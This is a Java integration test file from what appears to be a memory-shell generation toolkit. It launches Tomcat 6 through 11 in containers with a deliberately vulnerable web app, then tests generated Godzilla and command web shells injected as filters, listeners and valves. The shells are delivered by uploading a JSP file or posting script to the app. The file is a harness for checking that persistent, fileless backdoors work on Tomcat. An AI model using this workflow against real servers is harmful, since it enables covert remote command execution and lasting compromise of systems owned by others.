package com.reajason.javaweb.integration.tomcat;

import com.reajason.javaweb.config.CommandShellConfig;
import com.reajason.javaweb.config.GodzillaShellConfig;
import com.reajason.javaweb.config.Server;
import com.reajason.javaweb.integration.CommandShellTool;
import com.reajason.javaweb.integration.GodzillaShellTool;
import com.reajason.javaweb.integration.VulTool;
import com.reajason.javaweb.memsell.packer.Packer;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.utility.MountableFile;

import java.nio.file.Paths;

/**
 * @author ReaJason
 * @since 2024/11/28
 */
@Testcontainers
@Slf4j
public class TomcatIntegrationTest {

    public static final MountableFile warFile = MountableFile.forHostPath(Paths.get("../vul-webapp/build/libs/vul-webapp.war").toAbsolutePath());
    public static final MountableFile warJakartaFile = MountableFile.forHostPath(Paths.get("../vul-webapp-jakarta/build/libs/vul-webapp-jakarta.war").toAbsolutePath());

    // https://hub.docker.com/_/tomcat/tags
    public static final String tomcat6ImageName = "reajason/tomcat:6-jdk6";
    public static final String tomcat7ImageName = "tomcat:7.0.85-jre7";
    public static final String tomcat8ImageName = "tomcat:8-jre8";
    public static final String tomcat9ImageName = "tomcat:9-jre9";
    public static final String tomcat10ImageName = "tomcat:10.1-jre11";
    public static final String tomcat11ImageName = "tomcat:11.0-jre17";

    public String getUrl(GenericContainer<?> tomcat) {
        String host = tomcat.getHost();
        int port = tomcat.getMappedPort(8080);
        String url = "http://" + host + ":" + port + "/app";
        log.info("container started, app url is : {}", url);
        return url;
    }

    @Nested
    class Tomcat6 {
        @Container
        public final GenericContainer<?> tomcat = new GenericContainer<>(tomcat6ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        @ParameterizedTest(name = tomcat6ImageName + "|{0}Godzilla|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testGodzillaJSP(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_6, Packer.INSTANCE.JSP);
        }

        @ParameterizedTest(name = tomcat6ImageName + "|{0}Command|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testCommandJSP(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_6, Packer.INSTANCE.JSP);
        }
    }

    @Nested
    class Tomcat7 {

        @Container
        public final GenericContainer<?> tomcat = new GenericContainer<>(tomcat7ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);


        @ParameterizedTest(name = tomcat7ImageName + "|{0}Godzilla|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testGodzillaJSP(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_7, Packer.INSTANCE.JSP);
        }


        @ParameterizedTest(name = tomcat7ImageName + "|{0}Command|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testCommandJSP(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_7, Packer.INSTANCE.JSP);
        }
    }

    @Nested
    class Tomcat8 {

        @Container
        public final GenericContainer<?> tomcat = new GenericContainer<>(tomcat8ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        @ParameterizedTest(name = tomcat8ImageName + "|{0}Godzilla|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testGodzillaJSP(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.JSP);
        }

        @ParameterizedTest(name = tomcat8ImageName + "|{0}Godzilla|JS")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testGodzillaJS(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.ScriptEngine);
        }

        @ParameterizedTest(name = tomcat8ImageName + "|{0}Command|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testCommandJSP(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.JSP);
        }

        @ParameterizedTest(name = tomcat8ImageName + "|{0}Command|JS")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testCommandJS(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V1_8, Packer.INSTANCE.ScriptEngine);
        }
    }

    @Nested
    class Tomcat9 {

        @Container
        public final GenericContainer<?> tomcat = new GenericContainer<>(tomcat9ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        @ParameterizedTest(name = tomcat9ImageName + "|{0}Godzilla|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testGodzillaJSP(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V9, Packer.INSTANCE.JSP);
        }

        @ParameterizedTest(name = tomcat9ImageName + "|{0}Command|JSP")
        @ValueSource(strings = {TomcatShell.FILTER, TomcatShell.LISTENER, TomcatShell.VALVE})
        void testCommandJSP(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V9, Packer.INSTANCE.JSP);
        }
    }

    @Nested
    class Tomcat10 {

        @Container
        public final GenericContainer<?> tomcat = new GenericContainer<>(tomcat10ImageName)
                .withCopyToContainer(warJakartaFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        @ParameterizedTest(name = tomcat10ImageName + "|{0}Godzilla|JSP")
        @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
        void testGodzillaJSP(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V11, Packer.INSTANCE.JSP);
        }

        @ParameterizedTest(name = tomcat10ImageName + "|{0}Command|JSP")
        @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
        void testCommandJSP(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V11, Packer.INSTANCE.JSP);
        }
    }

    @Nested
    class Tomcat11 {

        @Container
        public final GenericContainer<?> tomcat = new GenericContainer<>(tomcat11ImageName)
                .withCopyToContainer(warJakartaFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        @ParameterizedTest(name = tomcat11ImageName + "|{0}Godzilla|JSP")
        @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
        void testGodzillaJSP(String shellType) {
            testGodzillaAssertOk(getUrl(tomcat), shellType, Opcodes.V17, Packer.INSTANCE.JSP);
        }

        @ParameterizedTest(name = tomcat11ImageName + "|{0}Command|JSP")
        @ValueSource(strings = {TomcatShell.JAKARTA_FILTER, TomcatShell.JAKARTA_LISTENER, TomcatShell.JAKARTA_VALVE})
        void testCommandJSP(String shellType) {
            testCommandAssertOk(getUrl(tomcat), shellType, Opcodes.V17, Packer.INSTANCE.JSP);
        }
    }

    private void testGodzillaAssertOk(String url, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
        String pass = "pass" + shellType;
        String key = "key" + shellType;
        String headerValue = "Godzilla" + shellType;
        GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
                .pass(pass).key(key)
                .headerName("User-Agent").headerValue(headerValue)
                .build();
        log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
        String content = GodzillaShellTool.generate(Server.TOMCAT, shellConfig, shellType, targetJdkVersion, packer);
        String shellUrl = url + "/";
        if (Packer.INSTANCE.JSP.equals(packer)) {
            String uploadEntry = url + "/upload";
            String filename = shellType + ".jsp";
            shellUrl = url + "/" + filename;
            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
            VulTool.urlIsOk(shellUrl);
        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
            String uploadEntry = url + "/js";
            VulTool.postJS(uploadEntry, content);
        }
        GodzillaShellTool.testIsOk(shellUrl, shellConfig);
    }

    private void testCommandAssertOk(String url, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
        String paramName = "Command" + shellType;
        CommandShellConfig config = CommandShellConfig.builder().paramName(paramName).build();
        String content = CommandShellTool.generate(Server.TOMCAT, config, shellType, targetJdkVersion, packer);
        log.info("generated {} command shell with paramName: {}", shellType, config.getParamName());
        String shellUrl = url + "/";
        if (Packer.INSTANCE.JSP.equals(packer)) {
            String uploadEntry = url + "/upload";
            String filename = shellType + ".jsp";
            shellUrl = url + "/" + filename;
            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
            VulTool.urlIsOk(shellUrl);
        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
            String uploadEntry = url + "/js";
            VulTool.postJS(uploadEntry, content);
        }
        CommandShellTool.testIsOk(shellUrl, config);
    }
}